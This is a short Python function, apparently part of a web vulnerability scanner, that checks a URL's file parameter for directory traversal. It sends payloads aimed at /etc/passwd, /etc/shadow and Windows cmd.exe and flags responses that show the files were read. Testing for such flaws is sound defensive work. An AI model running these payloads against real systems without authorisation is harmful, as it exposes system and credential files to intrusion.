import requests

def test_directory_traversal(url):
    traversal_payloads = [
        "../etc/passwd", "../../etc/passwd", "../../../etc/passwd",
        "../etc/shadow", "../../etc/shadow",
        "../windows/system32/cmd.exe", "../../windows/system32/cmd.exe"
    ]
    
    vulnerabilities = []

    for payload in traversal_payloads:
        test_url = f"{url}?file={payload}"  # Modify this based on site input structure
        print(f"  🔹 Testing payload: {payload}")

        try:
            response = requests.get(test_url, timeout=5)

            if "root:" in response.text or "NT AUTHORITY" in response.text:
                vulnerabilities.append({
                    "type": "Directory Traversal",
                    "payload": payload,
                    "recommendation": "Restrict file access and validate user input."
                })
                print("  ❌ Vulnerability Found!")

        except requests.exceptions.RequestException:
            print("  ⚠️ Connection Error. Skipping payload.")

    return vulnerabilities
